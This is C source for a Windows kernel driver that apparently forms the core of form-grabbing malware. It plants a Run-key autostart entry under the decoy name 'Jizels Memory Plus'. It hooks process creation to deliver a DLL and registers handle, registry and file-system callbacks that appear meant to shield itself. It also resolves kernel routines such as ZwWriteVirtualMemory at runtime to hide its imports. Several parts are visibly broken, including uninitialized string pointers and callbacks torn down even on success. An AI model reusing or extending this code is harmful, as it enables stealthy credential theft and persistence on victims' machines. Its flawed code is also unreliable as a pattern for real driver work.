#pragma comment(lib, "fltmgr.lib")
#include <ntifs.h>
#include <fltKernel.h>

#include "Header.h"

PDEVICE_OBJECT g_DeviceObject = NULL;
HANDLE hCallback = NULL;
PFLT_FILTER hFltFilter = NULL;
extern NTSTATUS AllRefernces();
BOOLEAN Configured = FALSE;
#ifdef FORMGRABBER
PUNICODE_STRING DllPath;
#endif
PDEVICE_OBJECT GlobalDeviceObject = NULL;
PUNICODE_STRING RegistryPath;
PUNICODE_STRING ServicePath;
PUNICODE_STRING altitude;
LARGE_INTEGER liRegistry;

const FLT_CONTEXT_REGISTRATION Contexts[] = {
	{ FLT_CONTEXT_END }
};

CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
	{ IRP_MJ_CREATE, 0, FltCreateFilePre,  NULL },
	{ IRP_MJ_OPERATION_END }
};

CONST FLT_REGISTRATION FilterRegistration = {
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	FLTFL_REGISTRATION_DO_NOT_SUPPORT_SERVICE_STOP,
	Contexts,
	Callbacks,
	NULL,
	FilterSetup,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};


void AquireLock(PDeviceConfig pdc) {


	pdc->context->OldIRQL = _KfAcquireSpinLock(&pdc->context->SpinLock);
}

void ReleaseLock(PDeviceConfig pdc) {
	_KfReleaseSpinLock(&pdc->context->SpinLock, pdc->context->OldIRQL);
}

PDeviceConfig GetConfig(PDEVICE_OBJECT DeviceObject) {
	return (PDeviceConfig)DeviceObject->DeviceExtension;
}
NTSTATUS AddKey() {
	UNICODE_STRING ValueName;
	WCHAR Startup[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	WCHAR Microsoftstr[] = L"Jizels Memory Plus";
	UNICODE_STRING psRegistry;
	RtlInitUnicodeString(&psRegistry, Startup);
	RtlInitUnicodeString(&ValueName, Microsoftstr);
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hRegHandle = NULL;
	ULONG Disposition;
	RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
	InitializeObjectAttributes(&ObjectAttributes, &psRegistry, OBJ_CASE_INSENSITIVE, NULL, NULL);
	st = _ZwCreateKey(&hRegHandle, KEY_ALL_ACCESS, &ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, &Disposition);
	if (NT_SUCCESS(st)) {
		st = _ZwSetValueKey(&hRegHandle, &ValueName, 0, REG_SZ, ServicePath->Buffer, ServicePath->Length);
		if (NT_SUCCESS(st)) {
			RegistryPath = &ValueName;
		}
		_ZwClose(hRegHandle);
	}
	
	return st;
}
NTSTATUS IrpClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	_IofCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
NTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	BOOLEAN Opened = FALSE;
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	DeviceConfig *Config = GetConfig(DeviceObject);
	Config->context->OldIRQL = _KfAcquireSpinLock(&Config->context->SpinLock);
	ULONG RequestorID = _IoGetRequestorProcessId(Irp);
	if (!Config->InUse) {
		Config->InUse = TRUE;
		Config->OwnerProcessID = RequestorID;
		Opened = TRUE;
	}
	_KfReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);

	st = Opened ? STATUS_SUCCESS : STATUS_SHARING_VIOLATION;

	Irp->IoStatus.Status = st;
	Irp->IoStatus.Information = 0;
	_IofCompleteRequest(Irp, IO_NO_INCREMENT);
	return st;
}
NTSTATUS UnknownIRP(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	UNREFERENCED_PARAMETER(Irp);
	AllRefernces();
	return STATUS_NOT_SUPPORTED;

}

VOID UnloadRoutine(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING dosObjectName;

	RtlInitUnicodeString(&dosObjectName, DOS_DEVICE_NAME);
	_IoDeleteSymbolicLink(&dosObjectName);
	_IoDeleteDevice(DriverObject->DeviceObject);

	_CmUnRegisterCallback(liRegistry);
#ifdef FORMGRABBER
	_PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, TRUE);
#endif
	_ObUnRegisterCallbacks(&liRegistry);
	_FltUnregisterFilter(hFltFilter);
	AllRefernces();
	
}
HANDLE hPostThread = NULL;
PVOID PostPacket = NULL;

NTSTATUS IrpControl(IN PDEVICE_OBJECT DeviceObject, IN IRP* Irp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(DeviceObject);
	//KdPrint(("Entering IRP_DeviceIoControl()\n"));

	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);
	if (IrpSp) {
		ULONG IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;

		PVOID Buffer = Irp->AssociatedIrp.SystemBuffer;
		ULONG BufferLength = IrpSp->Parameters.DeviceIoControl.OutputBufferLength;
		Irp->IoStatus.Information = 0;

		switch (IoControlCode) {
		case CONFIGURE:
		{
			DeviceConfig *Config = (PDeviceConfig)DeviceObject->DeviceExtension;
			Config->context->OldIRQL = _KfAcquireSpinLock(&Config->context->SpinLock);
			if (Buffer != NULL) {
				if (Config->InUse != FALSE) {
					CONFIG* config = _ExAllocatePool(PagedPool, BufferLength);
					RtlCopyMemory(config, Buffer, sizeof(CONFIG));
#ifdef FORMGRABBER
					RtlInitUnicodeString(DllPath, config->DLLPath);
#endif
					RtlInitUnicodeString(ServicePath, config->ProgramPath);
					AddKey();
					Configured = TRUE;
					_ExFreePool(config);

				}
			}

			_KfReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
			break;
		}

		}
	}
	return STATUS_SUCCESS;
}
NTSTATUS ResolveImports() {
	PUNICODE_STRING psPsLookupProcessByProcessId = NULL;
	PUNICODE_STRING psZwWriteVirtualMemory = NULL;
	PUNICODE_STRING psZwCreateFile = NULL;
	PUNICODE_STRING psExAllocatePoolWithTag = NULL;
	PUNICODE_STRING psZwReadFile = NULL;
	PUNICODE_STRING psZwAllocateVirtualMemory = NULL;
	PUNICODE_STRING psZwFreeVirtualMemory = NULL;
	PUNICODE_STRING psExFreePoolWithTag = NULL;
	PUNICODE_STRING psKfAcquireSpinLock = NULL;
	PUNICODE_STRING psKfReleaseSpinLock = NULL;
	PUNICODE_STRING psZwCreateKey = NULL;
	PUNICODE_STRING psZwSetValueKey = NULL;
	PUNICODE_STRING psZwClose = NULL;
	PUNICODE_STRING psIofCompleteRequest = NULL;
	PUNICODE_STRING psIoDeleteSymbolicLink = NULL;
	PUNICODE_STRING psIoDeleteDevice = NULL;
	PUNICODE_STRING psCmUnregisterCallback = NULL;
	PUNICODE_STRING psObUnRegisterCallbacks = NULL;
	PUNICODE_STRING psFltUnregisterFilter = NULL;
	PUNICODE_STRING psPsSetCreateProcessNotifyRoutineEx = NULL;
	PUNICODE_STRING psKeInitializeSpinLock = NULL;
	PUNICODE_STRING psIoCreateSymbolicLink = NULL;
	PUNICODE_STRING psObRegisterCallbacks = NULL;
	PUNICODE_STRING psFltRegisterFilter = NULL;
	PUNICODE_STRING psFltStartFiltering = NULL;
	PUNICODE_STRING psCmCallbackGetKeyObjectID = NULL;
	PUNICODE_STRING psRtlEqualUnicodeString = NULL;
	PUNICODE_STRING psFltReleaseFileNameInformation = NULL;
	PUNICODE_STRING psIoGetRequestorProcessId = NULL;
	PUNICODE_STRING psExAllocatePool = NULL;
	PUNICODE_STRING psIoCreateDevice = NULL;
	PUNICODE_STRING psCmRegisterCallbackEx = NULL;
	PUNICODE_STRING psZwOpenProcess = NULL;
	PUNICODE_STRING psFltGetFileNameInformation = NULL;
	PUNICODE_STRING psZwQueryInformationFile = NULL;

	RtlInitUnicodeString(psPsLookupProcessByProcessId, L"PsLookupProcessByProcessId");
	RtlInitUnicodeString(psZwWriteVirtualMemory, L"ZwWriteVirtualMemory");
	RtlInitUnicodeString(psZwCreateFile, L"ZwCreateFile");
	RtlInitUnicodeString(psExAllocatePoolWithTag, L"ExAllocatePoolWithTag");
	RtlInitUnicodeString(psZwReadFile, L"ZwReadFile");
	RtlInitUnicodeString(psZwAllocateVirtualMemory, L"ZwAllocateVirtualMemory");
	RtlInitUnicodeString(psZwFreeVirtualMemory, L"ZwFreeVirtualMemory");
	RtlInitUnicodeString(psExFreePoolWithTag, L"ExFreePoolWithTag");
	RtlInitUnicodeString(psKfAcquireSpinLock, L"KfAcquireSpinLock");
	RtlInitUnicodeString(psKfReleaseSpinLock, L"KfReleaseSpinLock");
	RtlInitUnicodeString(psZwCreateKey, L"ZwCreateKey");
	RtlInitUnicodeString(psZwSetValueKey, L"ZwSetValueKey");
	RtlInitUnicodeString(psZwClose, L"ZwClose");
	RtlInitUnicodeString(psIofCompleteRequest, L"IofCompleteRequest");
	RtlInitUnicodeString(psIoDeleteSymbolicLink, L"IoDeleteSymbolicLink");
	RtlInitUnicodeString(psIoDeleteDevice, L"IoDeleteDevice");
	RtlInitUnicodeString(psCmUnregisterCallback, L"CmUnregisterCallback");
	RtlInitUnicodeString(psObUnRegisterCallbacks, L"ObUnRegisterCallbacks");
	RtlInitUnicodeString(psFltUnregisterFilter, L"FltUnregisterFilter");
	RtlInitUnicodeString(psFltUnregisterFilter, L"FltUnregisterFilter");
	RtlInitUnicodeString(psPsSetCreateProcessNotifyRoutineEx, L"PsSetCreateProcessNotifyRoutineEx");
	RtlInitUnicodeString(psKeInitializeSpinLock, L"_KeInitializeSpinLock");
	RtlInitUnicodeString(psIoCreateSymbolicLink, L"IoCreateSymbolicLink");
	RtlInitUnicodeString(psObRegisterCallbacks, L"ObRegisterCallbacks");
	RtlInitUnicodeString(psFltRegisterFilter, L"FltRegisterFilter");
	RtlInitUnicodeString(psFltStartFiltering, L"FltStartFiltering");
	RtlInitUnicodeString(psCmCallbackGetKeyObjectID, L"CmCallbackGetKeyObjectID");
	RtlInitUnicodeString(psRtlEqualUnicodeString, L"RtlEqualUnicodeString");
	RtlInitUnicodeString(psFltReleaseFileNameInformation, L"FltReleaseFileNameInformation");
	RtlInitUnicodeString(psIoGetRequestorProcessId, L"IoGetRequestorProcessId");
	RtlInitUnicodeString(psExAllocatePool, L"ExAllocatePool");
	RtlInitUnicodeString(psIoCreateDevice, L"IoCreateDevice");
	RtlInitUnicodeString(psCmRegisterCallbackEx, L"CmRegisterCallbackEx");
	RtlInitUnicodeString(psZwOpenProcess, L"ZwOpenProcess");
	RtlInitUnicodeString(psFltGetFileNameInformation, L"FltGetFileNameInformation");
	RtlInitUnicodeString(psZwQueryInformationFile, L"ZwQueryInformationFile");


	_PsLookupProcessByProcessId = (__PsLookupProcessByProcessId)(ULONG_PTR)MmGetSystemRoutineAddress(psPsLookupProcessByProcessId);
	ZwWriteVirtualMemory = (_ZwWriteVirtualMemory)(ULONG_PTR)MmGetSystemRoutineAddress(psZwWriteVirtualMemory);
	_ZwCreateFile = (__ZwCreateFile)(ULONG_PTR)MmGetSystemRoutineAddress(psZwCreateFile);
	_ExAllocatePoolWithTag = (__ExAllocatePoolWithTag)(ULONG_PTR)MmGetSystemRoutineAddress(psExAllocatePoolWithTag);
	_ZwReadFile = (__ZwReadFile)(ULONG_PTR)MmGetSystemRoutineAddress(psZwReadFile);
	_ZwAllocateVirtualMemory = (__ZwAllocateVirtualMemory)(ULONG_PTR)MmGetSystemRoutineAddress(psZwAllocateVirtualMemory);
	_ZwFreeVirtualMemory = (__ZwFreeVirtualMemory)(ULONG_PTR)MmGetSystemRoutineAddress(psZwFreeVirtualMemory);
	_ExFreePoolWithTag = (__ExFreePoolWithTag)(ULONG_PTR)MmGetSystemRoutineAddress(psExFreePoolWithTag);
	_KfAcquireSpinLock = (__KfAcquireSpinLock)(ULONG_PTR)MmGetSystemRoutineAddress(psKfAcquireSpinLock);
	_KfReleaseSpinLock = (__KfReleaseSpinLock)(ULONG_PTR)MmGetSystemRoutineAddress(psKfReleaseSpinLock);
	_ZwCreateKey = (__ZwCreateKey)(ULONG_PTR)MmGetSystemRoutineAddress(psZwCreateKey);
	_ZwSetValueKey = (__ZwSetValueKey)(ULONG_PTR)MmGetSystemRoutineAddress(psZwSetValueKey);
	_ZwClose = (__ZwClose)(ULONG_PTR)MmGetSystemRoutineAddress(psZwClose);
	_IofCompleteRequest = (__IofCompleteRequest)(ULONG_PTR)MmGetSystemRoutineAddress(psIofCompleteRequest);
	_IoDeleteSymbolicLink = (__IoDeleteSymbolicLink)(ULONG_PTR)MmGetSystemRoutineAddress(psIoDeleteSymbolicLink);
	_IoDeleteDevice = (__IoDeleteDevice)(ULONG_PTR)MmGetSystemRoutineAddress(psIoDeleteDevice);
	_CmUnRegisterCallback = (__CmUnRegisterCallback)(ULONG_PTR)MmGetSystemRoutineAddress(psCmUnregisterCallback);
	_ObUnRegisterCallbacks = (__ObUnRegisterCallbacks)(ULONG_PTR)MmGetSystemRoutineAddress(psObUnRegisterCallbacks);
	_FltUnregisterFilter = (__FltUnregisterFilter)(ULONG_PTR)MmGetSystemRoutineAddress(psFltUnregisterFilter);
	_PsSetCreateProcessNotifyRoutineEx = (__PsSetCreateProcessNotifyRoutineEx)(ULONG_PTR)MmGetSystemRoutineAddress(psPsSetCreateProcessNotifyRoutineEx);
	_KeInitializeSpinLock = (__KeInitializeSpinLock)(ULONG_PTR)MmGetSystemRoutineAddress(psKeInitializeSpinLock);
	_IoCreateSymbolicLink = (__IoCreateSymbolicLink)(ULONG_PTR)MmGetSystemRoutineAddress(psIoCreateSymbolicLink);
	_ObRegisterCallbacks = (__ObRegisterCallbacks)(ULONG_PTR)MmGetSystemRoutineAddress(psObRegisterCallbacks);
	_IoGetRequestorProcessId = (__IoGetRequestorProcessId)(ULONG_PTR)MmGetSystemRoutineAddress(psIoGetRequestorProcessId);
	_ExAllocatePool = (__ExAllocatePool)(ULONG_PTR)MmGetSystemRoutineAddress(psExAllocatePool);
	_IoCreateDevice = (__IoCreateDevice)(ULONG_PTR)MmGetSystemRoutineAddress(psIoCreateDevice);
	_CmRegisterCallbackEx = (__CmRegisterCallbackEx)(ULONG_PTR)MmGetSystemRoutineAddress(psCmRegisterCallbackEx);
	_ZwOpenProcess = (__ZwOpenProcess)(ULONG_PTR)MmGetSystemRoutineAddress(psZwOpenProcess);
	_FltGetFileNameInformation = (__FltGetFileNameInformation)(ULONG_PTR)MmGetSystemRoutineAddress(psFltGetFileNameInformation);
	_ZwQueryInformationFile = (__ZwQueryInformationFile)(ULONG_PTR)MmGetSystemRoutineAddress(psZwQueryInformationFile);

	return STATUS_SUCCESS;
}
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING pus) {

	UNREFERENCED_PARAMETER(pus);
	NTSTATUS rv =  STATUS_UNSUCCESSFUL;
	UNICODE_STRING usDriverObject;
	UNICODE_STRING DosObject;
	PDEVICE_OBJECT Device = NULL;

	__try {
		ResolveImports();
		RtlInitUnicodeString(&usDriverObject, DEVICE_NAME);
		RtlInitUnicodeString(&DosObject, DOS_DEVICE_NAME);
		rv = _IoCreateDevice(DriverObject, 0, &usDriverObject, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &Device);
		DeviceConfig *Config = GetConfig(Device);
		RtlSecureZeroMemory(Config, sizeof(DeviceConfig));
		_KeInitializeSpinLock(&Config->context->SpinLock);

		if (NT_SUCCESS(rv)) {
			Device->Flags |= DO_DIRECT_IO;
			rv = _IoCreateSymbolicLink(&DosObject, &usDriverObject);
			if (NT_SUCCESS(rv)) {

				for (SIZE_T i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i) {
					DriverObject->MajorFunction[i] = UnknownIRP;
				}
				DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreate;
				DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpClose;
				DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpControl;

				DriverObject->DriverUnload = UnloadRoutine;
				//IoRegisterShutdownNotification(Device);
#ifdef FORMGRABBER
				rv = _PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, FALSE);
				if (NT_SUCCESS(rv)) {

				}
#endif
				OB_CALLBACK_REGISTRATION Callback;
				OB_OPERATION_REGISTRATION Operation[2];
				
				UNICODE_STRING Altitude;
				RtlInitUnicodeString(&Altitude, L"320001");
				Operation[0].ObjectType = PsProcessType;
				Operation[0].Operations |= OB_OPERATION_HANDLE_CREATE;
				Operation[0].Operations |= OB_OPERATION_HANDLE_DUPLICATE;
				Operation[0].PreOperation = PreOperationCallback;

				Operation[1].ObjectType = PsThreadType;
				Operation[1].Operations |= OB_OPERATION_HANDLE_CREATE;
				Operation[1].Operations |= OB_OPERATION_HANDLE_DUPLICATE;
				Operation[1].PreOperation = PreOperationCallback;
				Callback.Version = OB_FLT_REGISTRATION_VERSION;
				Callback.OperationRegistrationCount = 2;
				Callback.Altitude = Altitude;
				Callback.RegistrationContext = &Callback;
				Callback.OperationRegistration = Operation;
				
				rv = _ObRegisterCallbacks(&Callback, &hCallback);
				if (!NT_SUCCESS(rv)) {
#ifdef FORMGRABBER
					_PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, TRUE);
#endif
				}
				
				RtlInitUnicodeString(altitude, L"320000");
				rv = _CmRegisterCallbackEx(&RegistryCallBack, altitude, DriverObject, NULL, &liRegistry, NULL);
				if (!NT_SUCCESS(rv)) {
#ifdef FORMGRABBER
					_PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, TRUE);
#endif
					_ObUnRegisterCallbacks(&liRegistry);
				}
				rv = _FltRegisterFilter(DriverObject, &FilterRegistration, &hFltFilter);
				if (NT_SUCCESS(rv)) {
					rv = _FltStartFiltering(hFltFilter);
					if (!NT_SUCCESS(rv)) {
						_CmUnRegisterCallback(liRegistry);
#ifdef FORMGRABBER
						_PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, TRUE);
#endif
						_ObUnRegisterCallbacks(&liRegistry);
						_FltUnregisterFilter(hFltFilter);

					}
					else {

						_CmUnRegisterCallback(liRegistry);
#ifdef FORMGRABBER
						_PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, TRUE);
#endif
						_ObUnRegisterCallbacks(&liRegistry);
						_FltUnregisterFilter(hFltFilter);
					}
				}


			}
			else {
				_IoDeleteDevice(DriverObject->DeviceObject);
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	//	KdPrint(("exception occured in driver entry"));
		rv = STATUS_NONCONTINUABLE_EXCEPTION;
	}
	if (NT_SUCCESS(rv)) {
		g_DeviceObject = Device;
	}
	return rv;


}